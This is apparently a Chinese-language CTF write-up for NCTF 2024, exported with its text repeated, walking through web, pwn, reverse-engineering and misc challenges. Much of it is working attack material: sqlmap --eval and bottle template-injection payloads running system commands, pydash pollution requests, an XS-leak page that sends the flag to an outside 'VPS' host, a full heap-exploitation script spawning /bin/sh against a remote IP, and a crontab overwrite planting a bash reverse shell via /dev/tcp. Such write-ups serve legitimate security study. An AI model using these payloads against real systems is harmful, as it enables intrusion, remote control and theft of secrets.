apple来调用setcontext来写rop。rop用dup2来改输入输出的fd，这样就能拿到shell了。\n\n\n\n```python\nfrom pwn import *\n\ncontext(arch='amd64',os='linux')\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\"]\n#io=process(\"\")\n#io=remote(\"localhost\",9999)\nio=remote(\"39.106.16.204\", 33245)\nr = lambda a : io.recv(a)\nrl = lambda    a=False        : io.recvline(a)\nru = lambda a,b=True    : io.recvuntil(a,b)\ns = lambda x            : io.send(x)\nsl = lambda x            : io.sendline(x)\nsa = lambda a,b            : io.sendafter(a,b)\nsla = lambda a,b        : io.sendlineafter(a,b)\nshell = lambda            : io.interactive()\ndef debug(script=\"\"):\n    gdb.attach(io, gdbscript=script)\n\ndef add(size, content):\n    sla(\">\", \"1\")\nsla(\":\", str(size))\nsla(\":\", content)\n\ndef free(idx):\n    sla(\">\", \"2\")\nsla(\":\", str(idx))\n\ndef view(idx):\n    sla(\">\", \"4\")\nsla(\":\", str(idx))\n\ndef edit(idx, content):\n    sla(\">\", \"3\")\nsla(\":\", str(idx))\nsla(\":\", content)\n\nfor i in range(8):\n    add(0x500, \"A\"*4)\nadd(0x10, \"A\"*8)\n\nfor i in range(8):\n    free(i)\n\nadd(0x10, \"A\"*8)\nadd(0x10, \"A\"*8)\nadd(0x10, \"A\"*8)\nadd(0x10, \"A\"*8)\nadd(0x10, \"A\")\nadd(0x200, \"A\"*8)\nadd(0x300, \"A\"*8)\n\nview(5)\nru(\"A\"*8)\nlibc=u64(r(8))-0x203b00\nprint hex(libc)\n\nview(6)\nru(\"A\"*8)\nheap=u64(r(8))-0x1200\nprint hex(heap)\nedit(6, \"/bin/sh\\0\")\nadd(-1, \"A\"*8) #7\nadd(0x101, \"A\"*8)\nadd(0x101, \"A\"*8)\nfree(10)\nfree(9)\n\nstdout=libc+0x2045c0\nio_list_all=libc+0x2044c0\ntarget=(io_list_all)^(heap+0x1060)>>12\ntarget1=(stdout)^(heap+0x1080)>>12\n\np=\"A\"*0x10+p64(0)+p64(0x21)+p64(target)\np+=p64(0)+p64(0)+p64(0x111)+p64(target1)\n\nfake_io_addr=heap+0xd20\n\nedit(7, p)\nadd(0x101, p64(fake_io_addr))\n\nsystem=libc+0x58750\nenviron=libc+0x20ad58\n_IO_wfile_jumps=libc+0x202228\nsetcontext=libc+0x4a99d\n\nrop_addr=heap+0x850\nrax=libc+0xdd237\nrdi=libc+0x158748\nrsi=libc+0x02b46b\nsyscall=libc+0x127185+4\nrsp=libc+0x5ef6f\nrdx=libc+0x162e3a\n\nrop=p64(rax)+p64(0x21)\nrop+=p64(rdi)+p64(4)+p64(0)*5\nrop+=p64(rsi)+p64(0)*2\nrop+=p64(syscall)\n\nrop+=p64(rax)+p64(0x21)\nrop+=p64(rdi)+p64(4)+p64(0)*5\nrop+=p64(rsi)+p64(1)*2\nrop+=p64(syscall)\n\nrop+=p64(rax)+p64(0x3b)\nrop+=p64(rdi)+p64(heap+0xd20)+p64(0)*5\nrop+=p64(rsi)+p64(0)+p64(heap+0x978+0x28)\nrop+=p64(rdx)+p64(0)*3+p64(heap+0x978+0x28)\nrop+=p64(syscall)\n\nedit(5, rop)\n\nfake_io = flat({\n    0x0: \" sh;\",\n    0x10: p64(setcontext),\n    0x20: p64(stdout),\n    0x88: p64(rop_addr),  # _lock\n    0xa0: p64(stdout),\n    0xa8: p64(rsp),\n    0xd8: p64(_IO_wfile_jumps + 0x10),\n    0xe0: p64(stdout-8),\n}, filler=b\"\\x00\")\n\n\nadd(0x101, fake_io)\nshell()\n```\n\n\n\n## RE\n\n### ezDOS\n\n程序中间出现的花指令都直接nop去除，然后Apply patch到程序。\n\n![](/images/1742731823755-b823cf34-aab4-4fbe-bf7e-f53a4aaa3497.png)\n\n程序要求输入38长度字符串，然后进行一系列变种类RC4算法加密，然后与0x141地址的38字节数据进行比对。\n\n![](/images/1742732096513-faa2f920-70f8-4a36-93df-91f224f7c6d0.png)\n\n使用dosbox动调，在FA代码处是对取出的al对输入的字符串进行xor加密。0x32是取出的异或值，0x31是输入的字符'1'。\n\n![](/images/1742732287881-3999c9b7-5e31-4121-9f55-e2b906e10ccd.png)\n\n![](/images/1742732249120-5fda8d14-cb9b-4f49-8bf6-614e6960dc63.png)\n\n直接debug一直循环执行这边，即可拿到对输入字符串异或的一系列异或值。\n\n> 32 7d 59 7a f3 0d b3 7b 64 8c eb 28 c4 a4 50 30 a0 ed 27 6a e3 76 69 0c da 28 f8 08 ba a6 17 3e 12 59 45 06 4e f1\n\n取出0x142地址的38字节，进行异或即可得到解密flag。\n\n![](/images/1742732520225-ea38e755-4155-4ff4-b845-9fd37b9bcc95.png)\n\n### SafeProgram\n\n核心加密是一个SM4加密。\n\n![](/images/1742733064140-f984f029-5c19-40da-96a2-7c9933518e4b.png)\n\n查看byte_14002A0D0数组交叉引用，发现在其他函数被访问过。\n\n![](/images/1742733138431-04584683-08b6-44f7-a471-1549be8e206e.png)\n\n![](/images/1742733148877-755426b6-0cd4-4c98-86b0-49efafd7b7e6.png)\n\n发现是在VEH异常Handler里面调用的，第一个AddVectoredExceptionHandler得直接nop，不然运行就直接退出。\n\n![](/images/1742733208272-ce5e8263-86f4-4503-8a09-968a5e694740.png)\n\n![](/images/1742733215267-dd1e9a92-33aa-4250-a846-4191f12379b8.png)\n\n![](/images/1742733314872-bc3290b8-a385-47a3-965d-5477921a25a5.png)\n\n然后在这个函数开头断点，使用ScyllaHide插件一键去除反调试，防止其他地方的反调试。\n\n![](/images/1742733356084-873e99b1-43f0-4c23-9c16-33ce6afc2a5b.png)\n\nmain函数可以看到要求输入格式为NCTF{...}的长度38字符串，然后运行到箭头函数会触发除0异常，然后就会触发VEH那个Handler导致那个byte数组被修改，需要提取的数据是被改后的。\n\n![](/images/1742733443971-e0cf12c7-c12a-48b3-b557-7ff20d700ec6.png)\n\n动调时提取这三个数组数据，进行解密即可。\n\n![](/images/1742733627618-776e5556-677d-4108-957a-8081f3a182ad.png)\n\nkey是main函数两次memcpy那边的数据，结果如下。\n\n![](/images/1742733798575-ba99240d-931c-4963-aecb-87467e43e57a.png)\n\n解密代码：\n\n\n\n```cpp\n#include <iostream>\n#include <string>\n#include <windows.h>\n#include <vector>\n\nunsigned char byte_7FF699A4A0D0[256] = {\n0xD1, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05,\n0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,\n0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62,\n0xE4, 0xB3, 0x17, 0xA9, 0x1C, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6,\n0x47, 0x07, 0xA7, 0x4F, 0xF3, 0x73, 0x71, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0xD6, 0xA8,\n0x68, 0x6B, 0x81, 0xB2, 0xFC, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35,\n0x1E, 0x24, 0x0E, 0x78, 0x63, 0x58, 0x9F, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0xC9, 0x87,\n0xD4, 0x00, 0x46, 0x57, 0x5E, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E,\n0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1,\n0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3,\n0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F,\n0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51,\n0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8,\n0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0,\n0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84,\n0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48\n};\n\nunsigned int dword_7FF699A4A040[32] = {\n0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269, 0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9,\n0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249, 0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9,\n0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229, 0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299,\n0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209, 0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279\n};\nunsigned int dword_7FF699A4A028[4] = {\n0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC\n};\n\nstatic inline uint32_t rotate_left(uint32_t x, int n) \n{\n    return (x << n) | (x >> (32 - n));\n}\n\nstatic void generate_buf(const uint8_t* key, uint32_t* buf) \n{\n    for (int i = 0; i < 4; i++) \n        {\n            uint32_t key_dword;\n            memcpy(&key_dword, key + 4 * i, 4);\n            uint32_t converted_key = ((key_dword & 0xFF) << 24) |\n            ((key_dword & 0xFF00) << 8) |\n            ((key_dword >> 8) & 0xFF00) |\n            ((key_dword >> 24) & 0xFF);\n            buf[i] = dword_7FF699A4A028[i] ^ converted_key;\n        }\n    for (int j = 0; j < 32; j++) \n        {\n            uint32_t v12 = dword_7FF699A4A040[j] ^ buf[j + 3] ^ buf[j + 2] ^ buf[j + 1];\n            uint8_t* v12_bytes = (uint8_t*)&v12;\n            for (int k = 0; k < 4; k++)\n                {\n                    v12_bytes[k] = byte_7FF699A4A0D0[v12_bytes[k]];\n        }\n        uint32_t rot1 = rotate_left(v12, 23);\n        uint32_t rot2 = rotate_left(v12, 13);\n        buf[j + 4] = (rot1 ^ rot2 ^ v12) ^ buf[j];\n    }\n}\n\nvoid decrypt(const uint8_t* ciphertext, const uint8_t* key, uint8_t* plaintext)\n{\n    uint32_t buf[36] = { 0 };\n    uint32_t buf_1[36] = { 0 };\n\n    generate_buf(key, buf);\n\n    for (int ii = 0; ii < 4; ii++)\n    {\n        uint32_t cipher_dword;\n        memcpy(&cipher_dword, ciphertext + 4 * ii, 4);\n        buf_1[35 - ii] = ((cipher_dword >> 24) & 0xFF) |\n            ((cipher_dword >> 8) & 0xFF00) |\n            ((cipher_dword << 8) & 0xFF0000) |\n            ((cipher_dword << 24) & 0xFF000000);\n    }\n\n    for (int m = 31; m >= 0; m--)\n    {\n        uint32_t v12_0 = buf[m + 4] ^ buf_1[m + 3] ^ buf_1[m + 2] ^ buf_1[m + 1];\n        uint8_t* v12_bytes = (uint8_t*)&v12_0;\n        for (int n = 0; n < 4; n++) \n        {\n            v12_bytes[n] = byte_7FF699A4A0D0[v12_bytes[n]];\n        }\n        uint32_t rot1 = rotate_left(v12_0, 24);\n        uint32_t rot2 = rotate_left(v12_0, 18);\n        uint32_t rot3 = rotate_left(v12_0, 10);\n        uint32_t rot4 = rotate_left(v12_0, 2);\n        uint32_t L_result = rot1 ^ rot2 ^ rot3 ^ rot4 ^ v12_0;\n        buf_1[m] = buf_1[m + 4] ^ L_result;\n    }\n\n    for (int i = 0; i < 4; i++)\n    {\n        uint32_t v11 = buf_1[i];\n        uint8_t b0 = (v11 >> 24) & 0xFF;\n        uint8_t b1 = (v11 >> 16) & 0xFF;\n        uint8_t b2 = (v11 >> 8) & 0xFF;\n        uint8_t b3 = v11 & 0xFF;\n        uint32_t le = (b3 << 24) | (b2 << 16) | (b1 << 8) | b0;\n        memcpy(plaintext + 4 * i, &le, 4);\n    }\n}\n\nint main_safe()\n{\n    uint8_t key[] = \"NCTF24nctfNCTF24\";\n    unsigned char enc[32] = {\n    0xFB, 0x97, 0x3C, 0x3B, 0xF1, 0x99, 0x12, 0xDF, 0x13, 0x30, 0xF7, 0xD8, 0x7F, 0xEB, 0xA0, 0x6C,\n    0x14, 0x5B, 0xA6, 0x2A, 0xA8, 0x05, 0xA5, 0xF3, 0x76, 0xBE, 0xC9, 0x01, 0xF9, 0x36, 0x7B, 0x46\n    };\n\n    unsigned char flag[32]{};\n    decrypt(enc, key, flag);\n    decrypt(enc+16, key, flag+16);\n\n    printf(\"NCTF{%.32s}\\n\", flag);\n    \n    return 0;\n}\n```\n\n### gogo\n\nmain_main函数可以看到是将输入分块通过channel进行协程通信。\n\n![](/images/1742733969787-21f818ea-b6be-4352-b828-76c4dc10e07f.png)\n\n在main_main函数附件有一个带VM名字的函数，里面就是接收main那边发送的数据，然后底下有个函数执行，是通过操作数进行调用函数计算。这边一系列计算函数也印证想法。\n\n![](/images/1742734066317-01e3231e-c23a-4e3f-a5d0-e97c7be1dca8.png)\n\n![](/images/1742734121024-155535f9-6bfc-4362-903a-2dfd143e5b9b.png)\n\n对每个vm的函数都下断点输出，如XOR这样：\n\n![](/images/1742734219948-32e06585-6800-4f9b-8edc-494765f3de6e.png)\n\n![](/images/1742734255077-9adf8f22-88a0-4158-9da6-92eaa88ff49e.png)\n\n运行输入可以得到一堆伪代码计算过程，通过看到9e3779b9以及计算的特征，可以发现是XXTEA变种。\n\n![](/images/1742734417878-d64fe88d-06aa-4999-9e95-396404fccb0d.png)\n\n![](/images/1742735420532-84d41ca0-3eed-4411-80d2-858709f02190.png)\n\n通过分析可得知是将flag分成两份，20字节为一组，分别进行两种变种XXTEA计算，Key也不一样，不过都在这里面可以找到Key。\n\n还原加密代码如下，基于标准XXTEA进行修改的：\n\n```cpp\n#define DELTA 0x9e3779b9\n\n#define MX (((z >> 5 ^ y << 2) + (y >> 3 ^ z << 4)) ^ ((sum ^ y) + (key[(p & 3) ^ e] ^ z)))\n\n#define MX2 (((z << 5 ^ y >> 2) + (y << 3 ^ z >> 4)) ^ ((sum ^ y) + (key2[(p & 3) ^ e] ^ z)))\n\nuint32_t key[]{ 0x6e637466, 0x62ef0ed ,0xa78c0b4f, 0x32303234 };\n\nuint32_t key2[]{ 0x32303234, 0xd6eb12c3, 0x9f1cf72e, 0x4e435446 };\n\nvoid xxtea_1(uint32_t* v, int n)\n{\n    uint32_t y, z, sum;\n    unsigned p, rounds, e;\n    rounds = 16;\n    sum = 0;\n    z = v[n - 1];\n    do\n    {\n        sum += DELTA;\n        e = (sum >> 2) & 3;\n        for (p = 0; p < 5; p++)\n        {\n            y = v[(p + 1) % 5];\n            z = v[p] += MX;\n        }\n    } while (--rounds);\n}\n\nvoid xxtea_2(uint32_t* v, int n)\n{\n    uint32_t y, z, sum;\n    unsigned p, rounds, e;\n    rounds = 16;\n    sum = 0;\n    z = v[n - 1];\n    do\n    {\n        sum += DELTA;\n        e = (sum >> 2) & 3;\n        for (p = 0; p < 5; p++)\n        {\n            y = v[(p + 1) % 5];\n            z = v[p] += MX2;\n        }\n    } while (--rounds);\n}\n```\n\n在main_RET函数可以看到两组字符串的比对，都是20长度的比对，这两个数据就是加密后的flag了，提取出来分别进行解密即可。\n\n![](/images/1742736046971-85fbd00a-eb7b-40a2-953a-fa7c9807cbd7.png)\n\n解密代码：\n\n```cpp\n#include <iostream>\n#define DELTA 0x9e3779b9\n\n#define MX (((z >> 5 ^ y << 2) + (y >> 3 ^ z << 4)) ^ ((sum ^ y) + (key[(p & 3) ^ e] ^ z)))\n\n#define MX2 (((z << 5 ^ y >> 2) + (y << 3 ^ z >> 4)) ^ ((sum ^ y) + (key2[(p & 3) ^ e] ^ z)))\n\nuint32_t key[]{ 0x6e637466, 0x62ef0ed ,0xa78c0b4f, 0x32303234 };\n\nuint32_t key2[]{ 0x32303234, 0xd6eb12c3, 0x9f1cf72e, 0x4e435446 };\n\nvoid xxtea_decrypt1(uint32_t* v, int n)\n{\n    uint32_t y, z, sum;\n    unsigned rounds, e;\n    rounds = 16;\n    sum = DELTA * rounds;\n    y = v[0]; \n    do\n    {\n        e = (sum >> 2) & 3;\n        for (int p = 5 - 1; p >= 0; p--)\n        {\n            if (p == 0)\n                z = v[4];\n            else\n                z = v[(p-1)%5];\n\n            if (p == 4)\n                y = v[0];\n            else\n                y = v[p + 1];\n\n            v[p] -= MX;\n            \n        }\n        sum -= DELTA;\n    } while (--rounds);\n}\n\nvoid xxtea_decrypt2(uint32_t* v, int n)\n{\n    uint32_t y, z, sum;\n    unsigned rounds, e;\n    rounds = 16;\n    sum = DELTA * rounds;\n    y = v[0];\n    do\n    {\n        e = (sum >> 2) & 3;\n        for (int p = 5 - 1; p >= 0; p--)\n        {\n            if (p == 0)\n                z = v[4];\n            else\n                z = v[(p - 1) % 5];\n\n            if (p == 4)\n                y = v[0];\n            else\n                y = v[p + 1];\n\n            v[p] -= MX2;\n\n        }\n        sum -= DELTA;\n    } while (--rounds);\n}\n\nint main()\n{\n    unsigned char enc1[] =\n    {\n      0x5D, 0x45, 0xD5, 0xB9, 0x8C, 0x95, 0x9C, 0x38, 0x3B, 0xB1,\n      0x3E, 0x1E, 0x5F, 0xC8, 0xE8, 0xBB, 0x64, 0x38, 0x48, 0x69\n    };\n    unsigned char enc2[] =\n    {\n      0xDE, 0x81, 0xD8, 0xAD, 0xC2, 0xC4, 0xA6, 0x32, 0x1C, 0xAB,\n      0x61, 0x3E, 0xCB, 0xFF, 0xEF, 0xF1, 0x27, 0x30, 0x7A, 0x16\n    };\n\n    xxtea_decrypt1((uint32_t*)enc1, 5);\n    xxtea_decrypt2((uint32_t*)enc2, 5);\n    \n    printf(\"%.20s%.20s\\n\", enc1,enc2);\n\n    return 0;\n}\n```\n\n\n\n## MISC \n\n### <font style=\"color:#000000;\">X1crypsc</font>\n\n题目使用random库生成随机数，基于mt19937-32算法，选择W可以任意获取随机数数据，构造矩阵即可逆向mt19937的状态，即可预测随机数，攻击成功后进入下面的黑盒阶段。\n\n```python\nfrom pwn import *\nfrom random import Random\nimport sys\nfrom Crypto.Util.number import *\nfrom random import *\nfrom tqdm import *\n\n# ==========================\n#  Phase 1: 收集PRNG输出数据\n# ==========================\ndef collect_bits(p):\n    print(\"[+] Collecting 624*32 bits for MT19937 state...\")\n    \n    bits_collected = 0\n    D=[]\n    while bits_collected < 625 * 32:  \n        p.sendlineafter(b'option:', b'W')  # 选择武器刷新\n        p.recvuntil(b'Current attack value: ')\n        line = p.recvline().decode()\n        low, high = map(int, line.split(' ~ '))\n        base = low\n        add = high - base \n        \n        val1 = base\n        val2 = add\n\n        D.append(val1)\n        D.append(val2)\n        p.sendline(b'y')\n        bits_collected += 32\n        \n        sys.stdout.write(f\"\\rBits collected: {bits_collected}/20000\")\n        sys.stdout.flush()\n        \n        # 发送'n'不继续刷新\n        p.sendlineafter(b'?', b'n')\n\n    print(len(D))\n    return D\n\n# ==========================\n#  Phase 2: 预测坐标并攻击\n# ==========================\ndef attack_monster(p, predictor,D):\n    print('[+]')\n    while True:\n        # 预测下一个randrange(2025) x和y\n        x = predictor.randrange(2025)\n        y = predictor.randrange(2025)\n        print(x,y)\n        # 发送攻击指令\n        p.recvuntil(b'option:')\n        p.sendline(b'A')\n        p.recvuntil(b'aim:')\n        p.sendline(f\"{x} {y}\".encode())\n        \n        resp = p.recvuntil(b'\\n').decode()\n        \n        a=predictor.randint(D[-2],D[-1])\n        if b'Victory' in p.recvline():\n            print('-------------------------------------------------')\n            print(p.recv(1000))\n            return\n    \n\n#--------------------------------------------------------------\n\ncontext(log_level=\"debug\")\np = remote('39.106.16.204', 11448) \n\nDall = collect_bits(p)\nprint(Dall)\n\nn=1250\nD=Dall[:n]\nrng=Random()\n\ndef getRows(rng):\n    row=[]\n    for i in range(n):\n        row+=list(map(int, (bin(rng.getrandbits(16))[2:].zfill(16))))\n    return row\nM=[]\nfor i in (range(19968)):\n    state = [0]*624\n    temp = \"0\"*i + \"1\"*1 + \"0\"*(19968-1-i)\n    for j in range(624):\n        state[j] = int(temp[32*j:32*j+32],2)\n    rng.setstate((3,tuple(state+[624]),None)) \n    M.append(getRows(rng))\n    \nprint('--------------------------------------------------')\nM=Matrix(GF(2),M)\ny=[]\nfor i in range(n):\n    y+=list(map(int, (bin(D[i])[2:].zfill(16))))\ny=vector(GF(2),y)\ns=M.solve_left(y)\nG=[]\nfor i in range(624):\n    C=0\n    for j in range(32):\n        C<<=1\n        C|=int(s[32*i+j])\n    G.append(C)\nimport random\nRNG1 = random.Random()\nfor i in range(624):\n    G[i]=int(G[i])\nRNG1.setstate((int(3),tuple(G+[int(624)]),None))\n\n#------------------------------------------------------------\n#控制到当前状态\nRNG1.getrandbits(64)\nss=0\nd1=[]\nwhile ss < 625 * 32:\n    d1.append(RNG1.getrandbits(16))\n    d1.append(RNG1.getrandbits(16))\n    ss += 32\n\nprint(d1[-10:-1])\n\n\nprint('------------att-------------')\nattack_monster(p, RNG1,Dall)\n\np.interactive()\n\n#--------------------------------------------------------------\n```\n\n黑盒部分：\n\n只有输入文件名以及输入文件内容这些功能\n\n发现可以文件名任意写，覆盖crontab定时任务，执行shellcode来远程操控\n\n```bash\n....//....//....//....//etc/crontab\n\nSHELL=/bin/sh\n\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'\n```\n\n获得shell后寻找flag\n\n```bash\n#linux命令：\nfind / -type f -exec grep -l -i \"nctf\" {} + 2>/dev/null\n\n#Out:\n/proc/1/task/1/environ\n\n#linux命令：\ncat /proc/1/task/1/environ\n\n#Out：\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=comp-xlcrypsc-67706716887745083pclt4FLAG=nctf{760bd839-02ff-4b4f-b5a9-3b006910963a}KUBERNETES_PORT=tcp://192.168.0.1:443KUBERNETES_PORT_443_TCP=tcp://192.168.0.1:443KUBERNETES_PORT_443_TCP_PROTO=tcpKUBERNETES_PORT_443_TCP_PORT=443KUBERNETES_PORT_443_TCP_ADDR=192.168.0.1KUBERNETES_SERVICE_HOST=192.168.0.1KUBERNETES_SERVICE_PORT=443KUBERNETES_SERVICE_PORT_HTTPS=443HOME=/root\n\n```\n\n### QRcode Reconstruction\n\n![](/images/1742737001478-793cdfb8-490c-40bc-939e-41e4ccc41789.png)手搓。\n\n最后decode是\n\n![](/images/1742737035701-dfd8da36-52fa-4ed1-b08c-ee997cda532a.png)\n\n猜到flag是nctf{WeLc0mE_t0_Nctf_2024!!!}\n\n## CRYPTO\n\n爆零O.o\n","source":"_posts/NCTF24-不知道-WP.md","raw":"---\ntitle: NCTF24 不知道 WP\ndate: 2025-04-14 18:13:44\ntags: [cry,web,re,pwn,misc]\ncategories: wp\ntypora-root-url: ./..\n---\n\n# 战队名：不知道\n\n**排名：6**\n\n成员：LamentXU、Jerrythepro123、lianjin、Liv\n\n## ![](/images/1742736030430-b261e9ef-7633-418b-a3ba-ea5ac98f12ca.png)\n\n## WEB\n\n拉门特许超级无敌详细版：\n\n> https://www.cnblogs.com/LAMENTXU/articles/18799383\n\n### sqlmap-master\n\n签到题。\n\nsqlmap有个--exec可以执行。直接执行会有编码问题（我也不知道为什么）。但是可以用fromhex绕\n\npayload：\n\n> 127.0.0.1?id=1 --eval=exec(bytes.fromhex('5F5F696D706F72745F5F28276F7327292E73797374656D2827656E762729'))\n\n### ez_dash\n\n我是第一个报告非预期的（大声）\n\n根本不需要污染。bottle里<%也可以执行，waf没禁完。\n\n直接打abort回显。秒了。\n\n> GET /render?path=<%%20from%20bottle%20import%20abort%0afrom%20subprocess%20import%20getoutput%0aa=getoutput(\"env\")%0aabort(404,a)%20%>\n\n### ez_dash_revenge\n\n首先污染掉pydash的helpers.RESTRICTED_KEYS，不然拿不到__globals__\n\n> POST /setValue?name=pydash HTTP/1.1\n>\n> {\n>\n> \"path\": \"helpers.RESTRICTED_KEYS\",\n>\n> \"value\": \"123\"\n>\n> }\n\n然后setval找globals找bottle。改templete的路径，加一个/proc/self\n\n> POST /setValue?name=setval HTTP/1.1\n>\n> {\n>\n> \"path\": \"__globals__.bottle.TEMPLATE_PATH\",\n>\n> \"value\": [\"./\",\"./views/\",\n>\n> \t\"/proc/self/\"\n>\n> ]\n>\n> }\n\n随后直接render?path=environ即可\n\n### internal_api\n\nXS_leak，通过请求码来泄露。\n\nexp：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Error-Based Attack</title>\n</head>\n\n<body>\n    <script>\n        let currentFlag = \"nctf{\";\n        const chars = \"abcdef0123456789-{}\";\n\n        function sleep(ms) {\n            return new Promise(resolve => setTimeout(resolve, ms));\n        }\n\n        function checkCharacter(char) {\n            return new Promise((resolve) => {\n                let script = document.createElement('script');\n                script.src = `http://0.0.0.0:8000/internal/search?s=${currentFlag}${char}`;\n\n                script.onload = () => {\n                    document.head.removeChild(script);\n                    resolve(true);\n                };\n\n                script.onerror = () => {\n                    document.head.removeChild(script);\n                    resolve(false);\n                };\n\n                document.head.appendChild(script);\n            });\n        }\n\n        async function bruteforce() {\n            try {\n                while (!currentFlag.endsWith('}')) {\n                    for (let char of chars) {\n                        const isCorrect = await checkCharacter(char);\n                        if (isCorrect) {\n                            currentFlag += char;\n                            window.open(`http://VPS:8000/?flag=${currentFlag}`);\n                            await sleep(50);\n                            break;\n                        }\n                        await sleep(50);\n                    }\n                }\n            } catch (error) {\n                window.open(`http://VPS:8000/?error=${currentFlag}`);\n            }\n        }\n\n        bruteforce();\n    </script>\n</body>\n\n</html>\n```\n\nVPS起这个服务，bot访问即可\n\n![](/images/1742736741383-899b4fa3-fb61-4084-8d13-d712ca7d9aa2.png)\n\n## PWN\n\n### unauth-diary\n\n先创造largebin来泄漏libc和堆地址，之后创造一个大小为-1的堆块，这样可以溢出来打tcache poisioning。用stdout结构体打house of apple来调用setcontext来写rop。rop用dup2来改输入输出的fd，这样就能拿到shell了。\n\n\n\n```python\nfrom pwn import *\n\ncontext(arch='amd64',os='linux')\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\"]\n#io=process(\"\")\n#io=remote(\"localhost\",9999)\nio=remote(\"39.106.16.204\", 33245)\nr = lambda a : io.recv(a)\nrl = lambda    a=False        : io.recvline(a)\nru = lambda a,b=True    : io.recvuntil(a,b)\ns = lambda x            : io.send(x)\nsl = lambda x            : io.sendline(x)\nsa = lambda a,b            : io.sendafter(a,b)\nsla = lambda a,b        : io.sendlineafter(a,b)\nshell = lambda            : io.interactive()\ndef debug(script=\"\"):\n    gdb.attach(io, gdbscript=script)\n\ndef add(size, content):\n    sla(\">\", \"1\")\nsla(\":\", str(size))\nsla(\":\", content)\n\ndef free(idx):\n    sla(\">\", \"2\")\nsla(\":\", str(idx))\n\ndef view(idx):\n    sla(\">\", \"4\")\nsla(\":\", str(idx))\n\ndef edit(idx, content):\n    sla(\">\", \"3\")\nsla(\":\", str(idx))\nsla(\":\", content)\n\nfor i in range(8):\n    add(0x500, \"A\"*4)\nadd(0x10, \"A\"*8)\n\nfor i in range(8):\n    free(i)\n\nadd(0x10, \"A\"*8)\nadd(0x10, \"A\"*8)\nadd(0x10, \"A\"*8)\nadd(0x10, \"A\"*8)\nadd(0x10, \"A\")\nadd(0x200, \"A\"*8)\nadd(0x300, \"A\"*8)\n\nview(5)\nru(\"A\"*8)\nlibc=u64(r(8))-0x203b00\nprint hex(libc)\n\nview(6)\nru(\"A\"*8)\nheap=u64(r(8))-0x1200\nprint hex(heap)\nedit(6, \"/bin/sh\\0\")\nadd(-1, \"A\"*8) #7\nadd(0x101, \"A\"*8)\nadd(0x101, \"A\"*8)\nfree(10)\nfree(9)\n\nstdout=libc+0x2045c0\nio_list_all=libc+0x2044c0\ntarget=(io_list_all)^(heap+0x1060)>>12\ntarget1=(stdout)^(heap+0x1080)>>12\n\np=\"A\"*0x10+p64(0)+p64(0x21)+p64(target)\np+=p64(0)+p64(0)+p64(0x111)+p64(target1)\n\nfake_io_addr=heap+0xd20\n\nedit(7, p)\nadd(0x101, 